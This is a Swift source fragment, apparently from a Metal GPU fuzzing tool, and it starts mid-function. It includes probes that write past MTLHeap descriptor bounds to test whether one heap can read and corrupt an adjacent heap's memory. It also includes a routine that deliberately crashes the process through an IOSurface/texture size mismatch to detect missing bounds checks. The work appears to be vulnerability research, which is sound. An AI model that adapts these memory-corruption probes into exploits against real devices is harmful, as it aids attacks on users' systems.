                step("  h1.actual=\(actual1) h2.actual=\(actual2)")

                // Allocate full-actual buffer from each heap
                guard let buf1 = h1.makeBuffer(length: actual1, options: .storageModeShared),
                      let buf2 = h2.makeBuffer(length: actual2, options: .storageModeShared) else {
                    step("  bufs nil"); return
                }

                let p1 = buf1.contents().assumingMemoryBound(to: UInt8.self)
                let p2 = buf2.contents().assumingMemoryBound(to: UInt8.self)

                // Clear heap1 OOB region with 0x00
                for i in 0..<actual1 { p1[i] = 0x00 }

                // Write distinct sentinel pattern into ALL of heap2
                let sentinel: UInt8 = 0xAD
                for i in 0..<actual2 { p2[i] = sentinel }

                // Now scan heap1's OOB region (bytes 4096..<actual1) for sentinel
                var hits = 0
                for i in 4096..<actual1 {
                    if p1[i] == sentinel { hits += 1 }
                }

                if hits > 0 {
                    step("  *** ADJACENT: heap1 OOB reads \(hits)/\(actual1-4096) bytes of heap2 ***")
                    step("  *** heap1 OOB WRITE can corrupt heap2 memory ***")

                    // Confirm write: stamp 0xBE into heap1 OOB, check heap2
                    for i in 4096..<actual1 { p1[i] = 0xBE }
                    var writeHits = 0
                    for i in 0..<actual2 { if p2[i] == 0xBE { writeHits += 1 } }
                    step("  *** WRITE CONFIRM: \(writeHits) bytes of heap2 now read 0xBE via heap1 OOB ***")
                } else {
                    // Log VA distance — still useful
                    let va1 = UInt(bitPattern: p1)
                    let va2 = UInt(bitPattern: p2)
                    let dist = va2 > va1 ? va2 - va1 : va1 - va2
                    step("  not adjacent. VA dist=0x\(String(dist, radix: 16)) hits=\(hits)")
                }
            }
        }

        step("── Heap Adjacency complete ─────────────────")
        completion()
    }
}

// MTLHeap OOB suballoc probe.
// We observed: makeHeap(size:4096) → actual=16384 (4× roundup).
// Test: can we suballoc buffers LARGER than hd.size but within actual?
// If yes → Metal's heap descriptor boundary is decorative, not enforced.
func runHeapOOB(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap OOB Probe ──────────────────────────")

        let requestedSize = 4096
        let hd = MTLHeapDescriptor()
        hd.size = requestedSize
        hd.storageMode = .shared
        guard let heap = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actualSize = heap.size
        step("requested=\(requestedSize) actual=\(actualSize) gap=\(actualSize - requestedSize)")

        // Sizes to probe: just under requested, at requested, 2×, actual-1, actual, actual+1
        let probes = [
            requestedSize - 1,
            requestedSize,
            requestedSize * 2,
            actualSize - 1,
            actualSize,
            actualSize + 1,
            actualSize * 2,
        ]

        for sz in probes {
            autoreleasepool {
                step("  suballoc(\(sz)) — attempt")
                guard let buf = heap.makeBuffer(length: sz, options: .storageModeShared) else {
                    step("    → nil (refused)")
                    return
                }
                let real = buf.length
                step("    → OK bufLen=\(real) — writing full range")
                // Write pattern to entire buffer length Metal gave us
                let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
                for i in stride(from: 0, to: real, by: 256) { ptr[i] = 0xBB }
                ptr[real - 1] = 0xDD
                step("    → write OK — buf survives \(real) bytes")
                if sz > requestedSize && sz <= actualSize {
                    step("    *** OOB: suballoc past hd.size=\(requestedSize) accepted — allocator boundary not enforced")
                }
                if sz > actualSize {
                    step("    *** PAST actual — this shouldn't be reachable")
                }
            }
        }

        // Exhaustion test: fill heap until nil
        step("  exhaustion — suballoc 256 until nil")
        var count = 0
        var bufs: [MTLBuffer] = []
        while let b = heap.makeBuffer(length: 256, options: .storageModeShared) {
            bufs.append(b)
            count += 1
            if count > 10000 { break }
        }
        step("  filled \(count) × 256B = \(count*256) bytes before nil (actual=\(actualSize))")
        bufs.removeAll()

        step("── Heap OOB complete ───────────────────────")
        completion()
    }
}

// Deliberately trigger the mismatch crash — call this from its own button.
// WARNING: this WILL kill the process. Check crash log on next launch.
func runMismatchTest(log: FuzzLog) {
    let sl = SyncLog()
    func step(_ s: String) { sl.write(s); log.append(s) }
    guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); return }
    step("⚠ MISMATCH TEST — surf64 tex256 — process will die")
    guard let surf = IOSurface(properties: [
        .width:64,.height:64,.bytesPerElement:4,.bytesPerRow:256,.allocSize:16384
    ]) else { step("surf nil"); return }
    step("surf alloc OK — calling makeTexture with desc256 — GOODBYE")
    let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat:.bgra8Unorm, width:256, height:256, mipmapped:false)
    td.storageMode = .shared
    var excPtr: UnsafeMutablePointer<CChar>? = nil
    let tex = metal_make_texture_safe(device, td, surf as! IOSurfaceRef, 0, &excPtr)
    // If we're still alive (shouldn't happen):
    if let ep = excPtr { let m = String(cString: ep); free(ep); step("EXCEPTION: \(m)") }
    else if tex == nil { step("nil — no crash, bounds-checked silently") }
    else { step("*** OK — NO BOUNDS CHECK — OOB confirmed ***") }
}
